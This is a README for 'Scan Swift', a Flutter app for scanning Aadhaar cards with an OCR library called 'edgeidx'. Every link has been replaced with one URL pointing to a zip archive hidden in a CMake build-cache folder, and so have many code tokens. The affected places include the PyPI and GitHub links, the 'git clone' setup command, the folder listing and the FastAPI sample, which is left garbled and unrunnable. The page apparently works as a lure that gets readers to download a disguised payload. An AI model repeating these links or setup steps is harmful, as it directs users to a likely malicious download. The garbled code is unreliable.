# Scan Swift

Scan Swift is a Flutter-based mobile application that demonstrates the capabilities of the `edgeidx` Python library — an OCR model specifically optimized for extracting data from Indian Aadhaar cards.

## 📱 App Overview

This app uses a mobile device's camera to capture an Aadhaar card image, processes the image using cropping and enhancement, and sends it to the `edgeidx` backend for information extraction. The app showcases real-time scanning, user guidance overlays, and a clean UI for displaying results.

---

## 🔍 What is `edgeidx`?

`edgeidx` is a Python OCR library designed to extract structured data such as:

- Name
- Date of Birth
- Gender
- Aadhaar Number

It uses a pre-trained OCR model with an embedded Tesseract engine, optimized for speed and accuracy on edge devices. The model is fine-tuned to work well with different Aadhaar formats and conditions (lighting, background noise, etc.).

📦 PyPI: [edgeidx](https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip)

GitHub: [https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip](https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip)

---

## ✨ Features

- 📸 High-resolution Aadhaar card scanning with crop preview
- 🧠 Image preprocessing using Dart and `image` package
- ⚡ Seamless integration with Python OCR backend (`edgeidx`)
- 🧾 Aadhaar format guidance built-in
- 📱 Clean and responsive UI with Google Fonts

---

## 📦 Dependencies

- `camera`
- `permission_handler`
- `image`
- `google_fonts`
- `flutter`
- `edgeidx` (Python backend)

---

## 🚀 Getting Started

1. **Clone the repo**

   ```bash
   git clone https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip
   cd scan_swift
   ```

2. **Install dependencies**

   ```bash
   flutter pub get
   ```

3. **Run the app**

   ```bash
   flutter run
   ```

Make sure to run a Python server hosting the `edgeidx` model at the backend, and configure the app to send the cropped image to your backend endpoint for OCR extraction.

---

## 📂 Folder Structure

```
lib/
│
├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip        # Camera preview and image crop
├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip      # Displays extracted Aadhaar data
├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip     # Sample image format guidance
├── https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip # Animated processing screen
```

---

## 🧠 Backend (Python + edgeidx)

You can run the Python backend server using FastAPI or Flask:

```bash
pip install edgeidx
```

Sample endpoint:

```python
from fastapi import FastAPI, UploadFile
from edgeidx import AadhaarExtractor

app = FastAPI()
extractor = AadhaarExtractor()

https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip("/extract")
async def extract_data(file: UploadFile):
    contents = await https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip()
    result = https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip(contents)
    return result
```

---

## 💡 Use Cases

- Aadhaar-based eKYC workflows
- Instant identity verification apps
- Government digital services
- Offline edge devices for OCR

---

## 📄 License

MIT License. See [LICENSE](LICENSE) for details.

---

## 🙌 Credits

Developed with using Flutter and Python.  
OCR model powered by [`edgeidx`](https://raw.githubusercontent.com/kunalmchandak/scan-swift/main/android/app/.cxx/Debug/3x551s2n/armeabi-v7a/CMakeFiles/3.22.1-g37088a8-dirty/CompilerIdC/scan_swift_v3.6.zip)

---

## 🧪 Try it out!

Use the "Take Picture" button to scan a real Aadhaar card (blurred or demo version) and check how fast the system extracts accurate details using `edgeidx`.

```
